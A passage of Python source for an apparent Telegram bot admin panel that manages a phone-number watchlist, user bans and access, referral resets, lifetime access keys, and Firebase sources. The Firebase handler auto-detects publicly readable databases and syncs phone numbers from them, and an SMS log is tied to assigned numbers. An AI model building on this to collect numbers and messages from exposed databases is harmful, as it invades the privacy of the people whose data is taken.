    await call.message.answer("⭐ <b>Add to Watchlist</b>\n\nSend the phone number (e.g. +919XXXXXXXXX):")
    await state.set_state(S.add_watchlist); await call.answer()


@router.callback_query(F.data.startswith("wl_add_"))
async def cb_wl_add_from_num(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
    nid = call.data.split("wl_add_")[1]
    if not nid.isdigit(): return await call.answer()
    num = db.cx().execute("SELECT number FROM numbers WHERE id=?", (int(nid),)).fetchone()
    if not num: return await call.answer("Not found.", show_alert=True)
    number = num["number"]
    if number.startswith("DEV-"): return await call.answer("Can't watch ghost numbers.", show_alert=True)
    with db.cx() as c:
        c.execute("INSERT OR IGNORE INTO watchlist(number,added_by,added_at) VALUES(?,?,?)",
                  (number, call.from_user.id, _now_ist().strftime("%d-%m-%Y %H:%M")))
    db.log_action(call.from_user.id, "Watchlist Add", number)
    await call.answer(f"⭐ {number} added to watchlist!", show_alert=True)


@router.message(S.add_watchlist)
async def proc_add_watchlist(msg: Message, state: FSMContext):
    if msg.from_user.id not in ADMIN_IDS: return
    number = msg.text.strip()
    with db.cx() as c:
        c.execute("INSERT OR IGNORE INTO watchlist(number,added_by,added_at) VALUES(?,?,?)",
                  (number, msg.from_user.id, _now_ist().strftime("%d-%m-%Y %H:%M")))
    db.log_action(msg.from_user.id, "Watchlist Add", number)
    await msg.answer(f"✅ <code>{number}</code> added to watchlist!")
    await state.clear()


@router.callback_query(F.data.startswith("wl_remove_"))
async def cb_wl_remove(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
    wid = int(call.data.split("_")[2])
    row = db.cx().execute("SELECT number FROM watchlist WHERE id=?", (wid,)).fetchone()
    if row:
        with db.cx() as c:
            c.execute("DELETE FROM watchlist WHERE id=?", (wid,))
        db.log_action(call.from_user.id, "Watchlist Remove", row["number"])
    await call.answer("🗑 Removed.", show_alert=True)


# ══════════════════════════════════════════════════════════════
# USER MANAGEMENT
# ══════════════════════════════════════════════════════════════

@router.callback_query(F.data == "adm_users")
async def cb_adm_users(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
    total   = db.cx().execute("SELECT COUNT(*) as c FROM users").fetchone()["c"]
    unlocked= db.cx().execute("SELECT COUNT(*) as c FROM users WHERE is_unlocked=1").fetchone()["c"]
    banned  = db.cx().execute("SELECT COUNT(*) as c FROM users WHERE is_banned=1").fetchone()["c"]
    susp    = db.cx().execute("SELECT COUNT(*) as c FROM user_suspension").fetchone()["c"]
    await call.message.edit_text(
        f"╔══════════════════════╗\n"
        f"  👤 <b>USER MANAGEMENT</b>\n"
        f"╚══════════════════════╝\n\n"
        f"👥 Total: <b>{total}</b>\n"
        f"✅ Unlocked: <b>{unlocked}</b>\n"
        f"⛔ Banned: <b>{banned}</b>\n"
        f"🚫 Suspended: <b>{susp}</b>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔍 Lookup User",     callback_data="user_lookup_prompt")],
            [InlineKeyboardButton(text="📋 Recent Users",       callback_data="user_list_0")],
            [InlineKeyboardButton(text="📊 Referral Audit",    callback_data="referral_audit")],
            [InlineKeyboardButton(text="🔧 Fix Requests",      callback_data="adm_fix_requests")],
            [InlineKeyboardButton(text="♻️ Bulk Compensate",   callback_data="adm_bulk_compensate")],
            [InlineKeyboardButton(text="🧪 Test Mode",         callback_data="adm_test_mode")],
            [InlineKeyboardButton(text="🔙 Admin",             callback_data="back_admin")],
        ]))
    await call.answer()


@router.callback_query(F.data == "user_lookup_prompt")
async def cb_user_lookup_prompt(call: CallbackQuery, state: FSMContext):
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
    await call.message.answer("🔍 Send User ID or username to look up:")
    await state.set_state(S.user_lookup); await call.answer()


@router.message(S.user_lookup)
async def proc_user_lookup(msg: Message, state: FSMContext):
    if msg.from_user.id not in ADMIN_IDS: return
    await state.clear()
    query = msg.text.strip()
    if query.isdigit():
        u = db.cx().execute("SELECT * FROM users WHERE user_id=?", (int(query),)).fetchone()
    else:
        u = db.cx().execute("SELECT * FROM users WHERE username LIKE ?",
                            (f"%{query}%",)).fetchone()
    if not u:
        return await msg.answer("❌ User not found.")
    await _show_user_panel(msg.answer, u)


async def _show_user_panel(answer_fn, u):
    uid  = u["user_id"]
    susp = db.cx().execute("SELECT * FROM user_suspension WHERE user_id=?", (uid,)).fetchone()
    ref_count = db.cx().execute(
        "SELECT COUNT(*) as c FROM refer_log WHERE referrer_id=?", (uid,)).fetchone()["c"]
    sms_count = db.cx().execute(
        "SELECT COUNT(*) as c FROM sms_log WHERE number IN "
        "(SELECT number FROM numbers WHERE assigned_to=?)", (uid,)).fetchone()["c"]
    await answer_fn(
        f"╔══════════════════════╗\n"
        f"  👤 <b>USER PROFILE</b>\n"
        f"╚══════════════════════╝\n\n"
        f"🆔 UID: <code>{uid}</code>\n"
        f"👤 Username: @{u['username'] or 'N/A'}\n"
        f"🔓 Unlocked: {'✅ Yes' if u['is_unlocked'] else '❌ No'}\n"
        f"⛔ Banned: {'Yes' if u['is_banned'] else 'No'}\n"
        f"🚫 Suspended: {'Yes - ' + (susp['reason'] or 'No reason') if susp else 'No'}\n"
        f"👥 Referrals: {u['refer_count']} given / {ref_count} brought\n"
        f"💬 SMS via this user: {sms_count}",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🚫 Suspend",         callback_data=f"user_suspend_{uid}"),
             InlineKeyboardButton(text="✅ Unsuspend",        callback_data=f"user_unsuspend_{uid}")],
            [InlineKeyboardButton(text="🔓 Grant Access",     callback_data=f"user_grant_{uid}"),
             InlineKeyboardButton(text="🔒 Revoke Access",    callback_data=f"user_revoke_{uid}")],
            [InlineKeyboardButton(text="🔄 Reset Refs",       callback_data=f"user_reset_refs_{uid}"),
             InlineKeyboardButton(text="⛔ Ban",              callback_data=f"user_ban_{uid}")],
            [InlineKeyboardButton(text="♻️ Reset Refer Entry", callback_data=f"user_reset_referred_{uid}")],
        ]))


@router.callback_query(F.data.startswith("user_suspend_"))
async def cb_user_suspend(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
    uid = int(call.data.split("_")[2])
    with db.cx() as c:
        c.execute("INSERT OR REPLACE INTO user_suspension VALUES(?,?,?,?)",
                  (uid, call.from_user.id, "Admin suspended",
                   _now_ist().strftime("%d-%m-%Y %H:%M")))
    db.log_action(call.from_user.id, "User Suspended", str(uid))
    await call.answer(f"🚫 User {uid} suspended.", show_alert=True)
    try:
        await bot.send_message(uid, "🚫 Your account has been <b>suspended</b>. Contact admin.")
    except: pass


@router.callback_query(F.data.startswith("user_unsuspend_"))
async def cb_user_unsuspend(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
    uid = int(call.data.split("_")[2])
    with db.cx() as c:
        c.execute("DELETE FROM user_suspension WHERE user_id=?", (uid,))
    db.log_action(call.from_user.id, "User Unsuspended", str(uid))
    await call.answer(f"✅ User {uid} unsuspended.", show_alert=True)
    try:
        await bot.send_message(uid, "✅ Your account suspension has been <b>lifted</b>.")
    except: pass


@router.callback_query(F.data.startswith("user_revoke_"))
async def cb_user_revoke(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
    uid = int(call.data.split("_")[2])
    with db.cx() as c:
        c.execute("UPDATE users SET is_unlocked=0,access_key=NULL WHERE user_id=?", (uid,))
    db.log_action(call.from_user.id, "User Access Revoked", str(uid))
    await call.answer(f"🔒 Access revoked for {uid}.", show_alert=True)


@router.callback_query(F.data.startswith("user_grant_"))
async def cb_user_grant(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
    uid = int(call.data.split("_")[2])
    with db.cx() as c:
        c.execute("UPDATE users SET is_unlocked=1 WHERE user_id=?", (uid,))
    db.log_action(call.from_user.id, "User Access Granted", str(uid))
    await call.answer(f"✅ Access granted to {uid}.", show_alert=True)
    try:
        await bot.send_message(uid, "✅ Your access has been <b>granted</b> by admin!")
    except: pass


@router.callback_query(F.data.startswith("user_reset_refs_"))
async def cb_user_reset_refs(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
    uid = int(call.data.split("_")[3])
    with db.cx() as c:
        c.execute("UPDATE users SET refer_count=0 WHERE user_id=?", (uid,))
        c.execute("DELETE FROM refer_log WHERE referrer_id=?", (uid,))
    db.log_action(call.from_user.id, "Referrals Reset", str(uid))
    await call.answer(f"🔄 Referrals reset for {uid}.", show_alert=True)


@router.callback_query(F.data.startswith("user_reset_referred_"))
async def cb_user_reset_referred(call: CallbackQuery):
    """
    Resets a user's 'referred by' record so their referrer can send the link again.
    - Removes their refer_log row (as referred_id)
    - Decrements the referrer's refer_count by 1
    - Removes referral_audit row
    - Clears guard.db verification data so they can re-verify fresh
    - Notifies both users
    """
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
    uid = int(call.data.split("_")[3])

    # Find who referred this user
    row = db.cx().execute(
        "SELECT * FROM refer_log WHERE referred_id=?", (uid,)
    ).fetchone()

    if not row:
        await call.answer("ℹ️ No referral record found for this user.", show_alert=True)
        return

    referrer_id = row["referrer_id"]

    errors = []

    # Step 1: clear refer_log + referral_audit + decrement referrer count
    try:
        conn = db.cx()
        conn.execute("DELETE FROM refer_log WHERE referred_id=?", (uid,))
        conn.execute("DELETE FROM referral_audit WHERE referred_id=?", (uid,))
        conn.execute(
            "UPDATE users SET refer_count=MAX(0, refer_count-1) WHERE user_id=?",
            (referrer_id,)
        )
        conn.commit()
        conn.close()
    except Exception as e:
        errors.append(f"DB: {e}")

    # Step 2: clear guard.db entries
    try:
        guard.reset_user_verification(uid)
    except Exception as e:
        errors.append(f"Guard: {e}")

    # Step 3: clear any pending fix request for this user
    try:
        conn2 = db.cx()
        conn2.execute("DELETE FROM refer_fix_requests WHERE user_id=?", (uid,))
        conn2.commit()
        conn2.close()
    except Exception:
        pass

    db.log_action(call.from_user.id, "Refer Entry Reset",
                  f"referred={uid} referrer={referrer_id} errors={errors}")

    # Notify referred user
    try:
        await bot.send_message(
            uid,
            "╔══════════════════════╗\n"
            "  ♻️ <b>REFERRAL RESET</b>\n"
            "╚══════════════════════╝\n\n"
            "Admin has reset your referral entry as compensation.\n\n"
            "Your referrer can now send you the invite link again "
            "and their referral will be counted. Tap it when ready!"
        )
    except Exception: pass

    # Notify referrer
    try:
        await bot.send_message(
            referrer_id,
            "╔══════════════════════╗\n"
            "  ♻️ <b>REFERRAL RESET</b>\n"
            "╚══════════════════════╝\n\n"
            f"Admin has reset the referral entry for user <code>{uid}</code>.\n\n"
            "Send them your invite link again — it will count this time!"
        )
    except Exception: pass

    await call.answer(
        f"✅ Refer entry reset for user {uid}.\nReferrer {referrer_id} notified.",
        show_alert=True
    )


@router.callback_query(F.data == "adm_test_mode")
async def cb_adm_test_mode(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
    uid   = call.from_user.id
    limit = int(db.get("refer_limit") or 1)
    rkt   = db.get("refer_key_type") or "perm"
    dur   = db.get("refer_key_duration") or "1440"
    u     = db.cx().execute("SELECT * FROM users WHERE user_id=?", (uid,)).fetchone()

    # Guard.db status for admin
    try:
        gstatus = guard.get_verification_status(uid)
    except Exception as e:
        gstatus = f"Error: {e}"

    ref_count = db.cx().execute(
        "SELECT COUNT(*) as c FROM refer_log WHERE referrer_id=?", (uid,)).fetchone()["c"]

    await call.message.answer(
        "╔══════════════════════╗\n"
        "  🧪 <b>TEST MODE</b>\n"
        "╚══════════════════════╝\n\n"
        f"<b>Your account status:</b>\n"
        f"🔓 Unlocked: {'✅' if u and u.get('is_unlocked') else '❌'}\n"
        f"🔑 Has key: {'✅' if u and u.get('access_key') else '❌'}\n"
        f"👥 Refer count: <b>{u['refer_count'] if u else 0}</b> / limit <b>{limit}</b>\n"
        f"📋 Referrals in log: <b>{ref_count}</b>\n\n"
        f"<b>Guard.db status:</b>\n{gstatus}\n\n"
        "<b>Tests:</b>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔐 Send Me Verify Button",   callback_data="test_send_verify")],
            [InlineKeyboardButton(text="🔑 Test Key Generation",      callback_data="test_key_gen")],
            [InlineKeyboardButton(text="♻️ Reset My Test Data",       callback_data="test_reset_me")],
            [InlineKeyboardButton(text="🔙 Users",                    callback_data="adm_users")],
        ])
    )
    await call.answer()


@router.callback_query(F.data == "test_send_verify")
async def cb_test_send_verify(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
    uid = call.from_user.id
    # Simulate what guard does: add pending + send WebApp button
    try:
        guard.reset_user_verification(uid)  # clear any old state first
        guard.guard_db.add_pending(uid, uid)  # referrer = self for testing
        import asyncio as _aio
        loop = _aio.get_event_loop()
        await loop.run_in_executor(None, guard._send_webapp_button, uid)
        await call.answer("✅ Verify button sent! Submit your device fingerprint.", show_alert=True)
    except Exception as e:
        await call.answer(f"❌ Error: {e}", show_alert=True)


@router.callback_query(F.data == "test_key_gen")
async def cb_test_key_gen(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
    uid   = call.from_user.id
    limit = int(db.get("refer_limit") or 1)
    u     = db.cx().execute("SELECT * FROM users WHERE user_id=?", (uid,)).fetchone()
    if not u:
        await call.answer("❌ Your account not found in DB.", show_alert=True)
        return
    # Temporarily boost refer_count to trigger key generation
    original_count = u["refer_count"]
    original_key   = u["access_key"]
    try:
        conn = db.cx()
        conn.execute("UPDATE users SET refer_count=?, access_key=NULL, is_unlocked=0 WHERE user_id=?",
                     (limit, uid))
        conn.commit()
        conn.close()
        # Now simulate referral credit
        import asyncio as _aio
        result = await _aio.get_event_loop().run_in_executor(
            None, guard._relay_credit_referral, uid, 0)  # referred_id=0 (dummy)
        # Restore original state
        conn2 = db.cx()
        conn2.execute("UPDATE users SET refer_count=?, access_key=?, is_unlocked=? WHERE user_id=?",
                      (original_count, original_key, u.get("is_unlocked", 0), uid))
        conn2.execute("DELETE FROM refer_log WHERE referred_id=0")
        conn2.execute("DELETE FROM referral_audit WHERE referred_id=0")
        conn2.commit()
        conn2.close()
        if result.get("new_key"):
            await call.answer(
                f"✅ Key generation works!\nGenerated key: {result['new_key'][:20]}…\n(Test data rolled back)",
                show_alert=True)
        else:
            await call.answer("⚠️ Key generation ran but no key was produced. Check refer_limit setting.",
                              show_alert=True)
    except Exception as e:
        await call.answer(f"❌ Test failed: {e}", show_alert=True)


@router.callback_query(F.data == "test_reset_me")
async def cb_test_reset_me(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
    uid = call.from_user.id
    try:
        guard.reset_user_verification(uid)
        conn = db.cx()
        conn.execute("DELETE FROM refer_log WHERE referred_id=0")
        conn.execute("DELETE FROM referral_audit WHERE referred_id=0")
        conn.commit()
        conn.close()
        await call.answer("✅ Your test guard.db data cleared.", show_alert=True)
    except Exception as e:
        await call.answer(f"❌ Error: {e}", show_alert=True)


@router.callback_query(F.data == "adm_fix_requests")
async def cb_adm_fix_requests(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
    rows = db.cx().execute(
        "SELECT * FROM refer_fix_requests WHERE status='pending' ORDER BY id DESC LIMIT 20"
    ).fetchall()
    if not rows:
        await call.answer("✅ No pending fix requests.", show_alert=True)
        return
    text = ("╔══════════════════════╗\n"
            "  🔧 <b>FIX REQUESTS</b>\n"
            "╚══════════════════════╝\n\n")
    btns = []
    for r in rows:
        in_log = db.cx().execute(
            "SELECT referrer_id FROM refer_log WHERE referred_id=?", (r["user_id"],)).fetchone()
        ref_by = f"← <code>{in_log['referrer_id']}</code>" if in_log else "← no record"
        text += f"👤 <code>{r['user_id']}</code> @{r['username'] or 'N/A'} {ref_by}\n🕐 {r['requested_at']}\n\n"
        btns.append([
            InlineKeyboardButton(text=f"✅ {r['user_id']}", callback_data=f"fixreq_approve_{r['user_id']}"),
            InlineKeyboardButton(text=f"❌ {r['user_id']}", callback_data=f"fixreq_dismiss_{r['user_id']}"),
        ])
    btns.append([InlineKeyboardButton(text="🔙 Users", callback_data="adm_users")])
    await call.message.answer(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=btns))
    await call.answer()


@router.callback_query(F.data.startswith("fixreq_approve_"))
async def cb_fixreq_approve(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
    uid = int(call.data.split("_")[2])

    row = db.cx().execute(
        "SELECT * FROM refer_log WHERE referred_id=?", (uid,)).fetchone()
    if not row:
        with db.cx() as c:
            c.execute("UPDATE refer_fix_requests SET status='dismissed' WHERE user_id=?", (uid,))
        await call.answer("ℹ️ No referral record found — request dismissed.", show_alert=True)
        return

    referrer_id = row["referrer_id"]
    with db.cx() as c:
        c.execute("DELETE FROM refer_log WHERE referred_id=?", (uid,))
        c.execute("DELETE FROM referral_audit WHERE referred_id=?", (uid,))
        c.execute("UPDATE users SET refer_count=MAX(0, refer_count-1) WHERE user_id=?", (referrer_id,))
        c.execute("UPDATE refer_fix_requests SET status='approved' WHERE user_id=?", (uid,))

    guard.reset_user_verification(uid)
    db.log_action(call.from_user.id, "Fix Request Approved", f"referred={uid} referrer={referrer_id}")

    try:
        await bot.send_message(
            uid,
            "╔══════════════════════╗\n"
            "  ✅ <b>REFERRAL FIXED</b>\n"
            "╚══════════════════════╝\n\n"
            "Your referral fix request has been <b>approved</b>!\n\n"
            "Ask your referrer to send you the invite link again — "
            "it will count correctly this time.")
    except Exception: pass

    try:
        await bot.send_message(
            referrer_id,
            "╔══════════════════════╗\n"
            "  ✅ <b>REFERRAL FIXED</b>\n"
            "╚══════════════════════╝\n\n"
            f"Admin approved a referral fix for user <code>{uid}</code>.\n\n"
            "Send them your invite link again — it will count this time!")
    except Exception: pass

    await call.answer(f"✅ Approved & reset for user {uid}.", show_alert=True)


@router.callback_query(F.data.startswith("fixreq_dismiss_"))
async def cb_fixreq_dismiss(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
    uid = int(call.data.split("_")[2])
    with db.cx() as c:
        c.execute("UPDATE refer_fix_requests SET status='dismissed' WHERE user_id=?", (uid,))
    db.log_action(call.from_user.id, "Fix Request Dismissed", str(uid))
    try:
        await bot.send_message(
            uid,
            "╔══════════════════════╗\n"
            "  ❌ <b>REQUEST DISMISSED</b>\n"
            "╚══════════════════════╝\n\n"
            "Your referral fix request was reviewed and dismissed.\n"
            "Contact admin if you believe this is an error.")
    except Exception: pass
    await call.answer(f"❌ Dismissed request for user {uid}.", show_alert=True)


@router.callback_query(F.data == "adm_bulk_compensate")
async def cb_bulk_compensate(call: CallbackQuery):
    """
    Resets ALL referral records so every affected referrer can resend their link.
    - Clears entire refer_log + referral_audit
    - Resets refer_count to 0 for all users
    - Clears all guard.db verification data
    - Shows a preview first with a confirm button
    """
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
    total_refs  = db.cx().execute("SELECT COUNT(*) as c FROM refer_log").fetchone()["c"]
    affected    = db.cx().execute(
        "SELECT COUNT(DISTINCT referrer_id) as c FROM refer_log").fetchone()["c"]
    await call.message.answer(
        "╔══════════════════════╗\n"
        "  ♻️ <b>BULK COMPENSATE</b>\n"
        "╚══════════════════════╝\n\n"
        f"This will reset <b>ALL</b> referral data:\n\n"
        f"📋 Referral records: <b>{total_refs}</b>\n"
        f"👥 Referrers affected: <b>{affected}</b>\n\n"
        "Every referrer's count resets to 0, every referred user's "
        "entry is cleared — everyone can start fresh.\n\n"
        "⚠️ <b>This cannot be undone. Confirm?</b>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="✅ Yes, Reset All",  callback_data="adm_bulk_comp_confirm"),
             InlineKeyboardButton(text="❌ Cancel",           callback_data="adm_users")],
        ])
    )
    await call.answer()


@router.callback_query(F.data == "adm_bulk_comp_confirm")
async def cb_bulk_comp_confirm(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS: return await call.answer()

    # Collect all referred users before wiping so we can clear guard.db
    referred_users = [
        r["referred_id"]
        for r in db.cx().execute("SELECT referred_id FROM refer_log").fetchall()
    ]
    total = len(referred_users)

    with db.cx() as c:
        c.execute("DELETE FROM refer_log")
        c.execute("DELETE FROM referral_audit")
        c.execute("UPDATE users SET refer_count=0")

    # Clear guard.db for every affected user
    for uid in referred_users:
        guard.reset_user_verification(uid)

    db.log_action(call.from_user.id, "Bulk Compensate", f"{total} records wiped")
    await call.message.edit_text(
        "╔══════════════════════╗\n"
        "  ✅ <b>BULK COMPENSATE DONE</b>\n"
        "╚══════════════════════╝\n\n"
        f"♻️ <b>{total}</b> referral records cleared.\n"
        "All refer_counts reset to 0.\n"
        "All guard verification data cleared.\n\n"
        "Referrers can now resend their links and "
        "their referrals will count correctly.",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
            InlineKeyboardButton(text="🔙 Users", callback_data="adm_users")
        ]])
    )
    await call.answer("✅ Done")


@router.callback_query(F.data.startswith("user_ban_"))
async def cb_user_ban(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
    uid = int(call.data.split("_")[2])
    with db.cx() as c:
        c.execute("UPDATE users SET is_banned=1 WHERE user_id=?", (uid,))
    db.log_action(call.from_user.id, "User Banned", str(uid))
    await call.answer(f"⛔ User {uid} banned.", show_alert=True)


@router.callback_query(F.data == "user_list_0")
async def cb_user_list(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
    users = db.cx().execute("SELECT * FROM users ORDER BY user_id DESC LIMIT 20").fetchall()
    text  = "╔══════════════════════╗\n  👥 <b>RECENT USERS</b>\n╚══════════════════════╝\n\n"
    btns  = []
    for u in users:
        icon  = "✅" if u["is_unlocked"] else "🔒"
        susp  = "🚫" if db.cx().execute("SELECT 1 FROM user_suspension WHERE user_id=?",
                                         (u["user_id"],)).fetchone() else ""
        text += f"{icon}{susp} <code>{u['user_id']}</code> @{u['username'] or 'N/A'}  👥{u['refer_count']}\n"
        btns.append([InlineKeyboardButton(
            text=f"{icon}{susp} {u['user_id']} @{u['username'] or 'N/A'}",
            callback_data=f"user_detail_{u['user_id']}")])
    btns.append([InlineKeyboardButton(text="🔙 Users", callback_data="adm_users")])
    await call.message.answer(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=btns))
    await call.answer()


@router.callback_query(F.data.startswith("user_detail_"))
async def cb_user_detail(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
    uid = int(call.data.split("_")[2])
    u   = db.cx().execute("SELECT * FROM users WHERE user_id=?", (uid,)).fetchone()
    if not u: return await call.answer("Not found.", show_alert=True)
    await _show_user_panel(call.message.answer, u)
    await call.answer()


@router.callback_query(F.data == "referral_audit")
async def cb_referral_audit(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
    rows = db.cx().execute(
        "SELECT * FROM referral_audit ORDER BY id DESC LIMIT 20").fetchall()
    text = "╔══════════════════════╗\n  📊 <b>REFERRAL AUDIT</b>\n╚══════════════════════╝\n\n"
    if not rows:
        text += "<i>No referral records yet.</i>"
    else:
        for r in rows:
            text += (f"👤 <code>{r['referrer_id']}</code> → <code>{r['referred_id']}</code>\n"
                     f"   {r['status']}  |  🕐 {r['at']}\n\n")
    await call.message.answer(text)
    await call.answer()


# ══════════════════════════════════════════════════════════════
# ACTION LOGS
# ══════════════════════════════════════════════════════════════

@router.callback_query(F.data == "adm_logs")
async def cb_adm_logs(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
    rows = db.cx().execute(
        "SELECT * FROM action_logs ORDER BY id DESC LIMIT 25").fetchall()
    text = "╔══════════════════════╗\n  📜 <b>ACTION LOGS</b>\n╚══════════════════════╝\n\n"
    if not rows:
        text += "<i>No actions logged yet.</i>"
    else:
        for r in rows:
            admin = f"Admin <code>{r['admin_id']}</code>" if r["admin_id"] else "System"
            text += (f"🕐 {r['at']}\n"
                     f"👤 {admin}\n"
                     f"📋 <b>{r['action']}</b>\n"
                     f"<i>{r['detail'][:80]}</i>\n\n")
    await call.message.answer(text[:4000],
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
            InlineKeyboardButton(text="🔙 Admin", callback_data="back_admin")]]))
    await call.answer()


# ══════════════════════════════════════════════════════════════
# PATTERN STATS
# ══════════════════════════════════════════════════════════════

@router.callback_query(F.data == "adm_pattern_stats")
async def cb_pattern_stats(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
    rows = db.cx().execute(
        "SELECT * FROM pattern_stats ORDER BY success DESC").fetchall()
    text = "╔══════════════════════╗\n  📊 <b>PATTERN STATS</b>\n╚══════════════════════╝\n\n"
    if not rows:
        text += "<i>No pattern data yet.</i>"
    else:
        for r in rows:
            total = r["success"] + r["failure"]
            conf  = r["success"] / max(total, 1)
            conf_bar = "█" * int(conf * 10) + "░" * (10 - int(conf * 10))
            icon  = "🟢" if conf >= 0.8 else ("🟡" if conf >= 0.5 else "🔴")
            dis   = " [DISABLED]" if r.get("disabled") else ""
            text += (f"{icon} <b>Pattern {r['pattern']}{dis}</b>\n"
                     f"   ✅ Success: {r['success']}  |  ❌ Failure: {r['failure']}\n"
                     f"   <code>[{conf_bar}]</code> {conf:.0%}\n\n")
    await call.message.answer(text[:4000],
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
            InlineKeyboardButton(text="🔙 AI", callback_data="adm_ai_center")]]))
    await call.answer()


# ══════════════════════════════════════════════════════════════
# LIFETIME KEYS
# ══════════════════════════════════════════════════════════════

@router.callback_query(F.data == "adm_lifetime_key")
async def cb_lifetime_key(call: CallbackQuery, state: FSMContext):
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
    await call.message.answer(
        "♾ <b>Generate Lifetime Key(s)</b>\n\n"
        "How many lifetime keys? (1–10)\n"
        "<i>Lifetime keys never expire and can be used by multiple users.</i>")
    await state.set_state(S.gen_lifetime); await call.answer()


@router.message(S.gen_lifetime)
async def proc_gen_lifetime(msg: Message, state: FSMContext):
    if msg.from_user.id not in ADMIN_IDS: return
    await state.clear()
    if not msg.text.isdigit() or not (1 <= int(msg.text) <= 10):
        return await msg.answer("❌ Enter 1-10.")
    count = int(msg.text)
    now   = _now_ist().strftime("%d-%m-%Y %H:%M")
    keys  = []
    with db.cx() as c:
        for _ in range(count):
            k = gen_key()
            c.execute("INSERT OR IGNORE INTO access_keys VALUES(?,?,?,NULL,1,0)",
                      (k, msg.from_user.id, now))
            keys.append(k)
    db.log_action(msg.from_user.id, "Lifetime Keys Generated", f"Count: {count}")
    await msg.answer(
        f"♾ <b>{count} Lifetime Key(s) Generated</b>\n━━━━━━━━━━━━━━━━━━\n"
        + "\n".join(f"<code>{k}</code>" for k in keys)
        + "\n\n<i>These keys never expire.</i>")


# ══════════════════════════════════════════════════════════════
# SMART FIREBASE SETUP
# ══════════════════════════════════════════════════════════════

@router.callback_query(F.data == "adm_fb")
async def cb_adm_fb(call: CallbackQuery, state: FSMContext):
    if call.from_user.id not in ADMIN_IDS: return
    current = db.cx().execute("SELECT COUNT(*) as c FROM firebase_sources").fetchone()["c"]
    if current >= MAX_FB_SOURCES:
        return await call.answer(f"❌ Max {MAX_FB_SOURCES} Firebase sources reached.", show_alert=True)
    await call.message.answer(
        f"🔗 <b>Add Firebase URLs</b>  ({current}/{MAX_FB_SOURCES})\n\n"
        "Paste one or more URLs (one per line).\n"
        "Optional label after pipe:\n"
        "<code>https://project.firebaseio.com/.json | Office DB</code>\n\n"
        "🤖 <i>Auto-detect: public → saved · private → asks for API key</i>")
    await state.set_state(S.bulk_fb); await call.answer()


@router.message(S.bulk_fb)
async def cb_bulk_fb(msg: Message, state: FSMContext):
    if msg.from_user.id not in ADMIN_IDS: return
    raw = [l.strip() for l in msg.text.strip().splitlines() if l.strip().startswith("http")]
    if not raw:
        await state.clear()
        return await msg.answer("❌ No valid URLs (must start with https://)")

    def _auto_label(url):
        slug = url.replace(".json","").rstrip("/").split("//")[-1].split(".")[0]
        rnd  = ''.join(secrets.choice(string.ascii_lowercase + string.digits) for _ in range(5))
        return f"{slug[:12]}-{rnd}"

    pairs = [(l.split("|",1)[0].strip(),
              l.split("|",1)[1].strip() if "|" in l else _auto_label(l.split("|",1)[0].strip()))
             for l in raw]

    if len(pairs) == 1:
        url, name = pairs[0]
        sm = await msg.answer("🔍 <i>Testing connection…</i>")
        async with aiohttp.ClientSession() as sess:
            code, err = await fb_ping(sess, url)
        if code in (401, 403):
            clean = url.replace(".json","").rstrip("/")
            await state.update_data(pending_fb_url=clean, pending_fb_name=name)
            await state.set_state(S.fb_apikey)
            return await sm.edit_text(
                f"🔒 <b>Access Denied</b>\n\n"
                f"Database: <code>{clean}</code>\n\n"
                f"📝 Send the <b>API Key / Auth Token</b>:\n<i>(or /cancel)</i>")
        elif code == 0:
            await state.clear()
            return await sm.edit_text(f"❌ Cannot connect: {err or 'Timeout'}")
        elif code != 200:
            await state.clear()
            return await sm.edit_text(f"❌ HTTP {code} error.")
        await state.clear()
        await sm.edit_text("✅ <i>Public DB detected! Syncing…</i>")
        n, sync_err, stype = await sync_one(url, name)
        db.log_action(msg.from_user.id, "Firebase Added", f"{name}: {n} numbers [{stype}]")
        if sync_err:
            return await sm.edit_text(f"⚠️ Connected but sync error:\n{sync_err}")
        return await sm.edit_text(
            f"╔══════════════════════╗\n"
            f"  ✅ <b>FIREBASE ADDED!</b>\n"
            f"╚══════════════════════╝\n\n"
            f"🔢 Numbers synced: <b>{n}</b>\n"
            f"🏗 Structure: <b>{stype}</b>\n"
            f"<i>Auto-sync every 10 min.</i>")

    # Bulk mode
    await state.clear()
